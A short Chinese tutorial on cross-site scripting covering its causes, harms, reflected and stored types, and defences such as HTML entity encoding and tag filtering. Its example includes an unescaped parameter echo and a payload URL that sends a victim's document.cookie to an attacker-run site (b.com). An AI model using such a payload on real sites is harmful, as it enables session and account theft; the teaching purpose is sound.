### 什么是XSS

XSS，全称跨站脚本(cross site scripting),是一种注入式的攻击方式

### XSS成因

* 对于用户的输入没有严格控制而直接输出到页面
* 对非预期输入的信任

### XSS的危害

* 盗取各类用户账号
* 窃取数据
* 非法转账
* 挂马
* ...

### 举例

假设当我登录a.com后，我发现它的页面某些内容是根据url中的一个叫content参数直接显示的，猜测它的页面处理可能是这样，其它语言类似： 

```html

<html>
<head>
<title>XSS测试</title>
</head>
<body>
<%=request.getParameter("content")%> //看这里看这里，意思就是在页面输出content参数的内容，如果不做任何屏蔽，会有什么结果呢？
</body>

</html>
```

假设我知道了小明也注册了该网站，并且知道了他的邮箱(或者其它联系方式)，我做一个超链接发给他，超链接地址为：http://www.a.com?content=<script>window.open(“www.b.com?param=”+document.cookie)</script>，当小明点击这个链接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把小明在a.com中的cookie信息发送到b.com，b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了小明在a.com的cookie信息，cookie信息中可能存有登录密码，攻击成功！

### XSS的攻击方式

分为`反射型`和`存储型`

##### 反射型

发出请求时，XSS代码出现在url中，作为输入提交到服务器端，服务器端解析后响应。XSS代码随相应内容一起传回给浏览器，浏览器解析后执行。整个过程像一次反射，故称为反射型XSS。

##### 存储型

存储型与反射型的区别在于，提交的代码会存储于服务端（数据库，文件系统，内存），下次提交代码时不用再提交XSS代码。

### XSS的防御措施

主要是做好**转义**和**过滤**

`主要防御手段，还是在后台对前端传的字符串进行转义(html_encode),成熟的库有xss；辅之对标签名，属性等进行过滤；当然，前端也能做`

#####  编码 ： 对用户输入数据进行HTMl Entity编码

字符 | 十进制 | 转义字符
-- | --- | --
"" | &#34; | &quot;
& | &#38; | &amp;
< | &#60; | &lt;
> | &#62; | &gt;
空格 | &#160; | &nbsp;

##### 过滤

移除用户上传的DOM属性，如onerror等等；

移除用户上传的style节点，script节点，Iframe节点等等。

##### 校正

避免直接对HTML Entity解码；

使用Dom Parse转换，校正不配对的DOM标签

